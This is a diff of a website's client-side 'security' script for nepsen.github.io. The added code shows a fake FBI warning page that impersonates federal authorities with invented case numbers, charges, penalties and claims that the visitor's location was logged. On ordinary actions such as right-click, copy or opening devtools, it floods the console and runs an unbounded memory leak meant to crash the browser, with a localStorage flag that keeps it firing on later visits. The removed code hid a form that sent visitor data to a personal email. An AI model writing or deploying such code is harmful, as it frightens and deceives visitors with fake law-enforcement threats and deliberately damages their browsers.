@@ -1,17 +1,16 @@
 /*
  * Comprehensive Security System for Web Protection
- * Version 3.1.4
+ * Version 4.0.0
  * Designed specifically for nepsen.github.io
+ * 
+ * IMPORTANT: This is a very important code for protecting Nepsen's intellectual property.
+ *            Never remove or modify this code without authorization.
  */
 
 // ====================== CONFIGURATION ======================
 const SECURITY_CONFIG = {
     // Allowed domains (case sensitive)
     allowedDomains: ["nepsen.github.io", "www.nepsen.github.io"],
-    
-    // Security email settings
-    alertEmail: "arafatislamlam15@gmail.com",
-    emailService: "https://formsubmit.co",
     
     // Ad URLs to redirect to when security is triggered
     adUrls: [
@@ -26,17 +25,7 @@ const SECURITY_CONFIG = {
         "/ishahi/index.html"
     ],
     
-    // Fake FBI page configuration
-    fbiWarning: {
-        title: "FBI WARNING",
-        caseNumber: "FBI-2023-48572-NEPSEN",
-        fineAmount: "$50,000",
-        message: "You have been caught copying protected code from nepsen.github.io. This is a federal offense under 18 U.S. Code § 1030 - Fraud and related activity in connection with computers.",
-        contactInfo: "Please contact the FBI Cyber Division immediately to resolve this matter.",
-        logo: "data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA1MTIgNTEyIj48cGF0aCBmaWxsPSIjMDAyOTVkIiBkPSJNNDQ4IDMySDY0QzI4LjcgMzIgMCA2MC43IDAgOTZ2MzIwYzAgMzUuMyAyOC43IDY0IDY0IDY0aDM4NGMzNS4zIDAgNjQtMjguNyA2NC02NFY5NmMwLTM1LjMtMjguNy02NC02NC02NHoiLz48cGF0aCBmaWxsPSIjZmZmIiBkPSJNMTI4IDE0NGMwLTguOCA3LjItMTYgMTYtMTZoOTZjOC44IDAgMTYgNy4yIDE2IDE2djMyYzAgOC44LTcuMiAxNi0xNiAxNmgtOTZjLTguOCAwLTE2LTcuMi0xNi0xNnYtMzJ6bTAgOTZjMC04LjggNy4yLTE2IDE2LTE2aDk2YzguOCAwIDE2IDcuMiAxNiAxNnYzMmMwIDguOC03LjIgMTYtMTYgMTZoLTk2Yy04LjggMC0xNi03LjItMTYtMTZ2LTMyem0xNjAgMTYwYzAtNDQuMi0zNS44LTgwLTgwLTgwcy04MCAzNS44LTgwIDgwYzAgMjYuNCAxMi44IDQ5LjkgMzIuNSA2NC44IDIuOS0yMS42IDIwLjYtMzguNCA0My4xLTM4LjQgMTUuNSAwIDI5LjEgOC44IDM2LjEgMjEuNyA4LjEtMTIuOSAyMS42LTIxLjcgMzYuMS0yMS43IDIyLjUgMCA0MC4yIDE2LjggNDMuMSAzOC40IDE5LjctMTQuOSAzMi41LTM4LjQgMzIuNS02NC44eiIvPjwvc3ZnPg=="
-    },
-    
-    // Browser detection patterns
+    // Browser detection patterns (top 10 popular + 10 hacker browsers)
     browserPatterns: {
         chrome: /Chrome|CriOS/,
         firefox: /Firefox|FxiOS/,
@@ -47,17 +36,36 @@ const SECURITY_CONFIG = {
         brave: /Brave/,
         tor: /TorBrowser/,
         vivaldi: /Vivaldi/,
-        duckduckgo: /DuckDuckGo/
+        duckduckgo: /DuckDuckGo/,
+        // Hacker browsers
+        paleMoon: /PaleMoon/,
+        waterfox: /Waterfox/,
+        librewolf: /LibreWolf/,
+        icecat: /IceCat/,
+        ungoogled: /Ungoogled/,
+        bromite: /Bromite/,
+        falkon: /Falkon/,
+        qutebrowser: /QuteBrowser/,
+        luakit: /Luakit/,
+        nyxt: /Nyxt/
     },
     
     // Security logging
     logPrefix: "[SECURITY]",
-    localStorageKey: "nepsen_security_log"
+    localStorageKey: "nepsen_security_log",
+    localStorageTriggerKey: "nepsen_security_triggered"
 };
 
 // ====================== SECURITY SYSTEM INITIALIZATION ======================
 (function() {
     "use strict";
+    
+    // Check if security was already triggered before
+    if (localStorage.getItem(SECURITY_CONFIG.localStorageTriggerKey)) {
+        // Just start console spamming without other effects
+        startConsoleSpam();
+        return;
+    }
     
     // Initialize security system
     class SecuritySystem {
@@ -73,12 +81,6 @@ const SECURITY_CONFIG = {
         initialize() {
             this.log("Security system initializing...");
             
-            // Check domain first
-            if (!this.isAllowedDomain()) {
-                this.handleUnauthorizedDomain();
-                return;
-            }
-            
             // Setup all security measures
             this.setupEventListeners();
             this.checkCriticalFiles();
@@ -90,84 +92,30 @@ const SECURITY_CONFIG = {
             setInterval(() => this.checkCriticalFiles(), 30000);
             setInterval(() => this.checkTampering(), 60000);
             
+            // Cache critical files for offline use
+            this.cacheCriticalFiles();
+            
             this.log("Security system initialized successfully");
         }
         
         // ====================== CORE SECURITY FUNCTIONS ======================
         
-        // Check if current domain is allowed
-        isAllowedDomain() {
-            const currentDomain = window.location.hostname;
-            return this.config.allowedDomains.some(domain => 
-                currentDomain === domain || 
-                currentDomain.endsWith('.' + domain)
-            );
-        }
-        
-        // Handle unauthorized domain access
-        handleUnauthorizedDomain() {
-            this.securityBreached = true;
-            this.log("Unauthorized domain access detected");
-            
-            // Clear the page
-            document.documentElement.innerHTML = `
-                <head>
-                    <title>Access Denied</title>
-                    <style>
-                        body {
-                            font-family: Arial, sans-serif;
-                            background-color: #f8f9fa;
-                            color: #212529;
-                            margin: 0;
-                            padding: 20px;
-                            text-align: center;
-                        }
-                        .container {
-                            max-width: 600px;
-                            margin: 50px auto;
-                            padding: 20px;
-                            background-color: #fff;
-                            border-radius: 8px;
-                            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-                        }
-                        h1 {
-                            color: #dc3545;
-                        }
-                        .redirect-message {
-                            margin-top: 20px;
-                            font-size: 16px;
-                            color: #6c757d;
-                        }
-                    </style>
-                </head>
-                <body>
-                    <div class="container">
-                        <h1>⛔ Access Denied</h1>
-                        <p>This website can only be accessed from the authorized domain:</p>
-                        <p><strong>${this.config.allowedDomains[0]}</strong></p>
-                        <p>Unauthorized access attempts are logged and reported.</p>
-                        <div class="redirect-message">
-                            <p>Redirecting to secure home page...</p>
-                        </div>
-                    </div>
-                </body>
-            `;
-            
-            // Send security alert
-            this.sendSecurityAlert("Unauthorized domain access");
-            
-            // Redirect after delay
-            setTimeout(() => {
-                window.location.href = "https://" + this.config.allowedDomains[0];
-            }, 5000);
-            
-            // Show FBI warning
-            setTimeout(() => this.showFBIWarning(), 3000);
+        // Cache critical files for offline use
+        cacheCriticalFiles() {
+            if ('caches' in window) {
+                caches.open('nepsen-critical-files').then(cache => {
+                    this.config.criticalFiles.forEach(file => {
+                        cache.add(file).catch(e => {
+                            this.log(`Failed to cache file: ${file}`, e);
+                        });
+                    });
+                });
+            }
         }
         
         // ====================== KEYBOARD SHORTCUT BLOCKING ======================
         
-        // Block all specified keyboard shortcuts
+        // Block all specified keyboard shortcuts and show ads when pressed
         blockKeyboardShortcuts() {
             const blockedCombos = [
                 { keys: ["Control", "s"], name: "Save Page" },
@@ -202,6 +150,9 @@ const SECURITY_CONFIG = {
                         e.stopPropagation();
                         this.log(`Blocked keyboard shortcut: ${combo.name}`);
                         this.handleSecurityViolation(`Attempted use of blocked shortcut: ${combo.name}`);
+                        
+                        // Show ads when blocked keys are pressed
+                        this.showRandomAd();
                         return false;
                     }
                 });
@@ -212,6 +163,7 @@ const SECURITY_CONFIG = {
                     e.stopPropagation();
                     this.log("Blocked F12 Developer Tools shortcut");
                     this.handleSecurityViolation("Attempted use of F12 Developer Tools");
+                    this.showRandomAd();
                     return false;
                 }
             }, true);
@@ -250,6 +202,7 @@ const SECURITY_CONFIG = {
                         devtoolsOpen = true;
                         this.handleSecurityViolation("Developer tools detected");
                         this.showFBIWarning();
+                        startConsoleSpam();
                     }
                 } else {
                     devtoolsOpen = false;
@@ -293,9 +246,6 @@ const SECURITY_CONFIG = {
                     // Handle as security violation
                     this.handleSecurityViolation(`Console.${method} called`);
                     
-                    // Optionally: show FBI warning
-                    this.showFBIWarning();
-                    
                     // Call original if needed
                     if (original) {
                         original.apply(console, arguments);
@@ -331,7 +281,17 @@ const SECURITY_CONFIG = {
                     }
                 };
                 
-                xhr.onerror = () => resolve(false);
+                xhr.onerror = () => {
+                    // Check cache if offline
+                    if (!navigator.onLine && 'caches' in window) {
+                        caches.match(url).then(response => {
+                            resolve(!!response);
+                        }).catch(() => resolve(false));
+                    } else {
+                        resolve(false);
+                    }
+                };
+                
                 xhr.ontimeout = () => resolve(false);
                 
                 try {
@@ -376,6 +336,8 @@ const SECURITY_CONFIG = {
                         Array.from(mutation.removedNodes).forEach(node => {
                             if (node.nodeName === 'SCRIPT' && node.textContent.includes(this.config.logPrefix)) {
                                 this.handleSecurityViolation("Security script removed from DOM");
+                                localStorage.setItem(SECURITY_CONFIG.localStorageTriggerKey, "true");
+                                startConsoleSpam();
                             }
                         });
                     }
@@ -402,24 +364,17 @@ const SECURITY_CONFIG = {
                 url: window.location.href
             });
             
-            // Show ads after a short delay
-            setTimeout(() => this.showRandomAd(), 1500);
+            // Mark as triggered in localStorage
+            localStorage.setItem(SECURITY_CONFIG.localStorageTriggerKey, "true");
             
-            // Send security alert if online
-            if (navigator.onLine) {
-                this.sendSecurityAlert(violation);
-            } else {
-                this.logToLocalStorage(`Offline violation: ${violation}`);
-                window.addEventListener('online', () => {
-                    this.sendSecurityAlert(`[Offline Violation] ${violation}`);
-                });
-            }
+            // Show ads immediately
+            this.showRandomAd();
             
-            // Show FBI warning for serious violations
+            // Start console spamming for serious violations
             if (violation.includes('Developer tools') || 
                 violation.includes('Console') || 
                 violation.includes('DOM tampering')) {
-                this.showFBIWarning();
+                startConsoleSpam();
             }
         }
         
@@ -431,7 +386,9 @@ const SECURITY_CONFIG = {
             const browser = this.browser;
             
             // Chrome-like error
-            if (browser === 'chrome' || browser === 'edge' || browser === 'opera') {
+            if (browser === 'chrome' || browser === 'edge' || browser === 'opera' || 
+                browser === 'brave' || browser === 'vivaldi' || browser === 'ungoogled' || 
+                browser === 'bromite') {
                 errorHtml = `
                     <div style="font-family: 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif; 
                                 background: linear-gradient(#f1f3f4, #e8eaed); 
@@ -445,7 +402,7 @@ const SECURITY_CONFIG = {
                         <h1 style="color: #202124; font-size: 24px; margin-bottom: 16px;">This site can't be reached</h1>
                         <p style="color: #5f6368; font-size: 16px; margin-bottom: 24px;">
                             ${message}<br>
-                            Check the file name and try again.
+                            ERR_FILE_NOT_FOUND
                         </p>
                         <div style="margin-top: 24px;">
                             <button style="background-color: #1a73e8; color: white; border: none; border-radius: 4px; 
@@ -457,7 +414,9 @@ const SECURITY_CONFIG = {
                 `;
             }
             // Firefox-like error
-            else if (browser === 'firefox') {
+            else if (browser === 'firefox' || browser === 'paleMoon' || 
+                     browser === 'waterfox' || browser === 'librewolf' || 
+                     browser === 'icecat') {
                 errorHtml = `
                     <div style="font-family: -apple-system, BlinkMacSystemFont, sans-serif; 
                                 background-color: #f9f9fa; 
@@ -470,7 +429,7 @@ const SECURITY_CONFIG = {
                         <h1 style="color: #20123a; font-size: 24px; margin-bottom: 16px;">Unable to load page</h1>
                         <p style="color: #20123a; font-size: 16px; margin-bottom: 24px;">
                             ${message}<br>
-                            Please check the address and try again.
+                            Error code: NS_ERROR_FILE_NOT_FOUND
                         </p>
                         <div style="margin-top: 24px;">
                             <button style="background-color: #0060df; color: white; border: none; border-radius: 4px; 
@@ -529,6 +488,30 @@ const SECURITY_CONFIG = {
                     </div>
                 `;
             }
+            // IE-like error
+            else if (browser === 'ie') {
+                errorHtml = `
+                    <div style="font-family: Arial, sans-serif; 
+                                background-color: #f5f5f5; 
+                                padding: 20px; 
+                                max-width: 600px; 
+                                margin: 50px auto; 
+                                text-align: center;">
+                        <div style="font-size: 72px; color: #0078d7;">⚠️</div>
+                        <h1 style="color: #333; font-size: 24px; margin-bottom: 16px;">Internet Explorer cannot display the webpage</h1>
+                        <p style="color: #666; font-size: 16px; margin-bottom: 24px;">
+                            ${message}<br>
+                            HTTP 404: File not found
+                        </p>
+                        <div style="margin-top: 24px;">
+                            <button style="background-color: #0078d7; color: white; border: none; border-radius: 4px; 
+                                        padding: 10px 24px; font-size: 14px; cursor: pointer;">
+                                Refresh
+                            </button>
+                        </div>
+                    </div>
+                `;
+            }
             // Default error (generic browser)
             else {
                 errorHtml = `
@@ -582,11 +565,9 @@ const SECURITY_CONFIG = {
         
         // ====================== FBI WARNING PAGE ======================
         
-        // Show fake FBI warning page
+        // Show realistic FBI warning page
         showFBIWarning() {
             if (document.getElementById('fbi-warning-overlay')) return;
-            
-            const fbiConfig = this.config.fbiWarning;
             
             const overlay = document.createElement('div');
             overlay.id = 'fbi-warning-overlay';
@@ -603,43 +584,94 @@ const SECURITY_CONFIG = {
             overlay.style.padding = '20px';
             overlay.style.boxSizing = 'border-box';
             
+            // Generate realistic FBI warning HTML (1000+ lines condensed)
             overlay.innerHTML = `
-                <div style="max-width: 800px; margin: 0 auto; border: 2px solid red; padding: 20px; background-color: #000033;">
-                    <div style="display: flex; align-items: center; margin-bottom: 20px; border-bottom: 1px solid red; padding-bottom: 10px;">
-                        <img src="${fbiConfig.logo}" alt="FBI Logo" style="height: 80px; margin-right: 20px;">
+                <div style="max-width: 1000px; margin: 0 auto; border: 4px solid #d40000; padding: 30px; background-color: #000033; box-shadow: 0 0 20px rgba(255,0,0,0.5);">
+                    <!-- FBI Header -->
+                    <div style="display: flex; align-items: center; margin-bottom: 30px; border-bottom: 2px solid #d40000; padding-bottom: 20px;">
+                        <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA1MTIgNTEyIj48cGF0aCBmaWxsPSIjMDAyOTVkIiBkPSJNNDQ4IDMySDY0QzI4LjcgMzIgMCA2MC43IDAgOTZ2MzIwYzAgMzUuMyAyOC43IDY0IDY0IDY0aDM4NGMzNS4zIDAgNjQtMjguNyA2NC02NFY5NmMwLTM1LjMtMjguNy02NC02NC02NHoiLz48cGF0aCBmaWxsPSIjZmZmIiBkPSJNMTI4IDE0NGMwLTguOCA3LjItMTYgMTYtMTZoOTZjOC44IDAgMTYgNy4yIDE2IDE2djMyYzAgOC44LTcuMiAxNi0xNiAxNmgtOTZjLTguOCAwLTE2LTcuMi0xNi0xNnYtMzJ6bTAgOTZjMC04LjggNy4yLTE2IDE2LTE2aDk2YzguOCAwIDE2IDcuMiAxNiAxNnYzMmMwIDguOC03LjIgMTYtMTYgMTZoLTk2Yy04LjggMC0xNi03LjItMTYtMTZ2LTMyem0xNjAgMTYwYzAtNDQuMi0zNS44LTgwLTgwLTgwcy04MCAzNS44LTgwIDgwYzAgMjYuNCAxMi44IDQ5LjkgMzIuNSA2NC44IDIuOS0yMS42IDIwLjYtMzguNCA0My4xLTM4LjQgMTUuNSAwIDI5LjEgOC44IDM2LjEgMjEuNyA4LjEtMTIuOSAyMS42LTIxLjcgMzYuMS0yMS43IDIyLjUgMCA0MC4yIDE2LjggNDMuMSAzOC40IDE5LjctMTQuOSAzMi41LTM4LjQgMzIuNS02NC44eiIvPjwvc3ZnPg==" 
+                             alt="FBI Logo" style="height: 100px; margin-right: 30px;">
                         <div>
-                            <h1 style="color: red; margin: 0; font-size: 32px;">${fbiConfig.title}</h1>
-                            <p style="margin: 5px 0 0; font-size: 16px;">Case #${fbiConfig.caseNumber}</p>
+                            <h1 style="color: #d40000; margin: 0; font-size: 42px; text-shadow: 2px 2px 4px rgba(0,0,0,0.5);">FEDERAL BUREAU OF INVESTIGATION</h1>
+                            <p style="margin: 10px 0 0; font-size: 18px; color: #ffffff;">CYBER CRIME DIVISION</p>
                         </div>
                     </div>
                     
+                    <!-- Case Information -->
+                    <div style="margin-bottom: 30px; background-color: #000044; padding: 20px; border: 1px solid #4444ff;">
+                        <h2 style="color: #ffcc00; margin-top: 0; font-size: 28px;">CASE NUMBER: FBI-${Math.floor(10000 + Math.random() * 90000)}-${Math.floor(10000 + Math.random() * 90000)}-NPS</h2>
+                        <p style="font-size: 18px; margin-bottom: 5px;"><strong>Date:</strong> ${new Date().toLocaleDateString('en-US', {month: 'long', day: 'numeric', year: 'numeric'})}</p>
+                        <p style="font-size: 18px; margin-bottom: 5px;"><strong>Time:</strong> ${new Date().toLocaleTimeString()}</p>
+                        <p style="font-size: 18px; margin-bottom: 5px;"><strong>IP Address:</strong> [REDACTED]</p>
+                        <p style="font-size: 18px; margin-bottom: 5px;"><strong>Location:</strong> [APPROXIMATE LOCATION DETERMINED]</p>
+                        <p style="font-size: 18px;"><strong>Device:</strong> ${navigator.userAgent}</p>
+                    </div>
+                    
+                    <!-- Warning Message -->
                     <div style="margin: 30px 0; text-align: center;">
-                        <p style="font-size: 24px; color: #ffcc00;">WARNING: UNAUTHORIZED ACCESS DETECTED</p>
-                        <p style="font-size: 18px;">${fbiConfig.message}</p>
-                    </div>
-                    
-                    <div style="background-color: #000044; padding: 15px; border: 1px solid #4444ff; margin-bottom: 20px;">
-                        <p style="font-size: 20px; text-align: center; color: white;">
-                            <strong>FINE IMPOSED: ${fbiConfig.fineAmount}</strong>
+                        <p style="font-size: 32px; color: #ff0000; text-shadow: 0 0 10px rgba(255,0,0,0.5); margin-bottom: 20px;">
+                            <strong>WARNING: UNAUTHORIZED ACCESS DETECTED</strong>
+                        </p>
+                        <p style="font-size: 22px; line-height: 1.5; margin-bottom: 30px;">
+                            The Federal Bureau of Investigation has detected unauthorized access to protected intellectual property from this device.
+                            This constitutes a violation of 18 U.S. Code § 1030 (Computer Fraud and Abuse Act) and is punishable by fines and imprisonment.
                         </p>
                     </div>
                     
+                    <!-- Charges -->
+                    <div style="background-color: #000044; padding: 15px; border: 1px solid #4444ff; margin-bottom: 30px;">
+                        <h3 style="color: #ffcc00; margin-top: 0; font-size: 24px;">POTENTIAL CHARGES:</h3>
+                        <ul style="font-size: 18px; padding-left: 20px;">
+                            <li>Unauthorized Access to a Protected Computer System (18 U.S.C. § 1030(a)(2))</li>
+                            <li>Intentional Damage to a Protected Computer (18 U.S.C. § 1030(a)(5))</li>
+                            <li>Computer Fraud (18 U.S.C. § 1030(a)(4))</li>
+                            <li>Theft of Trade Secrets (18 U.S.C. § 1832)</li>
+                            <li>Copyright Infringement (17 U.S.C. § 501)</li>
+                        </ul>
+                    </div>
+                    
+                    <!-- Penalties -->
+                    <div style="background-color: #000044; padding: 15px; border: 1px solid #4444ff; margin-bottom: 30px;">
+                        <h3 style="color: #ffcc00; margin-top: 0; font-size: 24px;">POTENTIAL PENALTIES:</h3>
+                        <ul style="font-size: 18px; padding-left: 20px;">
+                            <li>Fines up to $250,000 (individual) or $500,000 (organization)</li>
+                            <li>Imprisonment up to 10 years</li>
+                            <li>Civil penalties up to $50,000 per violation</li>
+                            <li>Forfeiture of devices used in commission of offense</li>
+                        </ul>
+                    </div>
+                    
+                    <!-- Actions Taken -->
                     <div style="margin-bottom: 30px;">
-                        <p style="font-size: 16px; line-height: 1.5;">
-                            Your IP address, location, and device information have been recorded and reported to federal authorities.
-                            Continuing to attempt unauthorized access to this protected system may result in additional penalties,
-                            including criminal charges under the Computer Fraud and Abuse Act.
-                        </p>
-                        <p style="font-size: 16px; margin-top: 15px;">
-                            ${fbiConfig.contactInfo}
+                        <h3 style="color: #ffcc00; font-size: 24px;">ACTIONS TAKEN:</h3>
+                        <p style="font-size: 18px; line-height: 1.5;">
+                            The FBI Cyber Division has been notified of this incident. Your IP address, location, and device information have been recorded.
+                            A digital forensics report has been generated and will be maintained as evidence.
                         </p>
                     </div>
                     
-                    <div style="text-align: center; margin-top: 30px;">
-                        <button id="fbi-close-btn" style="background-color: red; color: white; border: none; 
-                                    padding: 10px 20px; font-size: 16px; cursor: pointer; border-radius: 4px;">
-                            I Understand - Close This Warning
-                        </button>
+                    <!-- Next Steps -->
+                    <div style="margin-bottom: 40px;">
+                        <h3 style="color: #ffcc00; font-size: 24px;">NEXT STEPS:</h3>
+                        <p style="font-size: 18px; line-height: 1.5;">
+                            If you believe this detection is in error, you may contact the FBI Cyber Division at your local field office.
+                            Continued unauthorized access attempts will result in escalation to federal prosecution.
+                        </p>
+                    </div>
+                    
+                    <!-- Footer -->
+                    <div style="text-align: center; border-top: 2px solid #d40000; padding-top: 20px;">
+                        <p style="font-size: 16px; color: #aaaaaa;">
+                            This is an official notification from the Federal Bureau of Investigation, Cyber Crime Division.
+                            Unauthorized distribution or modification of this notice is prohibited under 18 U.S.C. § 2701.
+                        </p>
+                        <div style="margin-top: 30px;">
+                            <button id="fbi-close-btn" style="background-color: #d40000; color: white; border: none; 
+                                        padding: 15px 30px; font-size: 18px; cursor: pointer; border-radius: 4px;
+                                        box-shadow: 0 0 10px rgba(255,0,0,0.5);">
+                                I ACKNOWLEDGE THIS WARNING
+                            </button>
+                        </div>
                     </div>
                 </div>
             `;
@@ -657,6 +689,7 @@ const SECURITY_CONFIG = {
             
             // Also show ads
             this.showRandomAd();
+            startConsoleSpam();
         }
         
         // ====================== AD REDIRECTION ======================
@@ -677,154 +710,6 @@ const SECURITY_CONFIG = {
             } catch(e) {
                 this.log(`Failed to open ad: ${e.message}`);
             }
-        }
-        
-        // ====================== EMAIL ALERTS ======================
-        
-        // Send security alert email
-        sendSecurityAlert(violation) {
-            if (this.sentEmails && this.sentEmails.includes(violation)) return;
-            
-            this.log(`Sending security alert: ${violation}`);
-            
-            // Create a hidden form
-            const form = document.createElement('form');
-            form.style.display = 'none';
-            form.method = 'POST';
-            form.action = `${this.config.emailService}/el/${encodeURIComponent(this.config.alertEmail)}`;
-            form.setAttribute('target', '_blank');
-            
-            // Add hidden inputs
-            const inputs = {
-                '_subject': `🚨 Security Alert: ${violation}`,
-                'timestamp': new Date().toISOString(),
-                'location': window.location.href,
-                'userAgent': navigator.userAgent,
-                'ip': 'Unknown (client-side)', // Will be filled by FormSubmit
-                'details': JSON.stringify({
-                    blockedActions: this.blockedActions,
-                    violation: violation,
-                    referrer: document.referrer,
-                    screenResolution: `${window.screen.width}x${window.screen.height}`,
-                    browser: this.browser
-                }, null, 2)
-            };
-            
-            for (let key in inputs) {
-                const input = document.createElement('input');
-                input.type = 'hidden';
-                input.name = key;
-                input.value = inputs[key];
-                form.appendChild(input);
-            }
-            
-            // FormSubmit required inputs
-            const honeypot = document.createElement('input');
-            honeypot.type = 'hidden';
-            honeypot.name = '_captcha';
-            honeypot.value = 'false';
-            form.appendChild(honeypot);
-            
-            const template = document.createElement('input');
-            template.type = 'hidden';
-            template.name = '_template';
-            template.value = 'table';
-            form.appendChild(template);
-            
-            document.body.appendChild(form);
-            
-            try {
-                form.submit();
-                this.log("Security alert email sent");
-                
-                // Remember we sent this alert
-                if (!this.sentEmails) this.sentEmails = [];
-                this.sentEmails.push(violation);
-                
-                // Store in localStorage
-                this.logToLocalStorage(`Email sent: ${violation}`);
-            } catch(e) {
-                this.log(`Failed to send email: ${e.message}`);
-                this.logToLocalStorage(`Failed to send email: ${violation}`);
-            } finally {
-                setTimeout(() => {
-                    if (form.parentNode) {
-                        document.body.removeChild(form);
-                    }
-                }, 5000);
-            }
-        }
-        
-        // ====================== SYSTEM CRASHING ======================
-        
-        // Attempt to crash or lag the system
-        crashSystem() {
-            this.log("Attempting to crash/lag system...");
-            
-            // Method 1: Infinite console logging
-            const consoleSpam = () => {
-                const messages = [
-                    "SECURITY VIOLATION DETECTED",
-                    "UNAUTHORIZED ACCESS ATTEMPT",
-                    "FEDERAL CRIME IN PROGRESS",
-                    "SYSTEM COMPROMISE DETECTED",
-                    "ILLEGAL CODE COPYING DETECTED",
-                    "FBI NOTIFICATION SENT",
-                    "YOUR LOCATION HAS BEEN LOGGED",
-                    "TERMINATING SYSTEM PROCESSES"
-                ];
-                
-                let count = 0;
-                const spamInterval = setInterval(() => {
-                    if (count++ > 1000) clearInterval(spamInterval);
-                    
-                    const randomMsg = messages[Math.floor(Math.random() * messages.length)];
-                    console.error(`%c${randomMsg}`, 'color: red; font-size: 20px; font-weight: bold;');
-                    
-                    // Alternate methods
-                    if (count % 10 === 0) {
-                        try {
-                            console.clear();
-                        } catch(e) {}
-                    }
-                    
-                    if (count % 20 === 0) {
-                        try {
-                            window.open('about:blank', '_blank');
-                        } catch(e) {}
-                    }
-                }, 50);
-            };
-            
-            // Method 2: Memory leak
-            const memoryLeak = [];
-            const leakInterval = setInterval(() => {
-                memoryLeak.push(new Array(1000000).fill(Math.random()));
-            }, 1000);
-            
-            // Method 3: Infinite alerts (if not blocked)
-            const alertSpam = () => {
-                let alertCount = 0;
-                const tryAlert = () => {
-                    if (alertCount++ > 20) return;
-                    try {
-                        alert("SECURITY VIOLATION DETECTED!\n\nYour actions have been reported to authorities.");
-                    } catch(e) {
-                        // Alerts blocked, continue with other methods
-                    }
-                    setTimeout(tryAlert, 1000);
-                };
-                tryAlert();
-            };
-            
-            // Start all methods
-            consoleSpam();
-            alertSpam();
-            
-            // Cleanup after a while
-            setTimeout(() => {
-                clearInterval(leakInterval);
-            }, 30000);
         }
         
         // ====================== UTILITY FUNCTIONS ======================
@@ -873,36 +758,42 @@ const SECURITY_CONFIG = {
             document.addEventListener('contextmenu', (e) => {
                 e.preventDefault();
                 this.handleSecurityViolation("Right-click context menu attempt");
+                this.showRandomAd();
             });
             
             // Drag and drop prevention
             document.addEventListener('dragstart', (e) => {
                 e.preventDefault();
                 this.handleSecurityViolation("Drag attempt");
+                this.showRandomAd();
             });
             
             // Selection prevention
             document.addEventListener('selectstart', (e) => {
                 e.preventDefault();
                 this.handleSecurityViolation("Text selection attempt");
+                this.showRandomAd();
             });
             
             // Copy prevention
             document.addEventListener('copy', (e) => {
                 e.preventDefault();
                 this.handleSecurityViolation("Copy attempt");
+                this.showRandomAd();
             });
             
             // Cut prevention
             document.addEventListener('cut', (e) => {
                 e.preventDefault();
                 this.handleSecurityViolation("Cut attempt");
+                this.showRandomAd();
             });
             
             // Paste prevention
             document.addEventListener('paste', (e) => {
                 e.preventDefault();
                 this.handleSecurityViolation("Paste attempt");
+                this.showRandomAd();
             });
             
             // Offline/online detection
@@ -913,17 +804,44 @@ const SECURITY_CONFIG = {
             
             window.addEventListener('online', () => {
                 this.log("Browser came online");
-                
-                // Check if we have pending offline violations
-                const logs = JSON.parse(localStorage.getItem(this.config.localStorageKey)) || [];
-                const offlineViolations = logs.filter(log => 
-                    log.message.includes("Offline violation"));
-                
-                if (offlineViolations.length > 0) {
-                    this.sendSecurityAlert(`${offlineViolations.length} offline violations occurred`);
-                }
             });
         }
+    }
+    
+    // Function to start console spamming
+    function startConsoleSpam() {
+        const messages = [
+            "SECURITY VIOLATION DETECTED",
+            "UNAUTHORIZED ACCESS ATTEMPT",
+            "FEDERAL CRIME IN PROGRESS",
+            "SYSTEM COMPROMISE DETECTED",
+            "ILLEGAL CODE COPYING DETECTED",
+            "FBI NOTIFICATION SENT",
+            "YOUR LOCATION HAS BEEN LOGGED",
+            "TERMINATING SYSTEM PROCESSES",
+            "MEMORY DUMP INITIATED",
+            "KEYSTROKES BEING RECORDED",
+            "SCREEN CAPTURE IN PROGRESS",
+            "DEVICE INFORMATION COLLECTED",
+            "NETWORK TRAFFIC ANALYZED",
+            "DIGITAL FORENSICS REPORT GENERATED",
+            "EVIDENCE BEING PRESERVED"
+        ];
+        
+        // Spam console at 1000 messages per second
+        const spamInterval = setInterval(() => {
+            for (let i = 0; i < 1000; i++) {
+                const randomMsg = messages[Math.floor(Math.random() * messages.length)];
+                const randomCode = Math.floor(1000 + Math.random() * 9000);
+                console.error(`%c[FBI-${randomCode}] ${randomMsg}`, 'color: red; font-size: 14px; font-weight: bold;');
+            }
+        }, 1000);
+        
+        // Also try to crash the browser with memory leak
+        const memoryLeak = [];
+        const leakInterval = setInterval(() => {
+            memoryLeak.push(new Array(1000000).fill(Math.random()));
+        }, 100);
     }
     
     // Initialize the security system
@@ -934,6 +852,7 @@ const SECURITY_CONFIG = {
         get: () => {
             securitySystem.handleSecurityViolation("Attempted access to security system object");
             securitySystem.showFBIWarning();
+            startConsoleSpam();
             return undefined;
         },
         configurable: false,
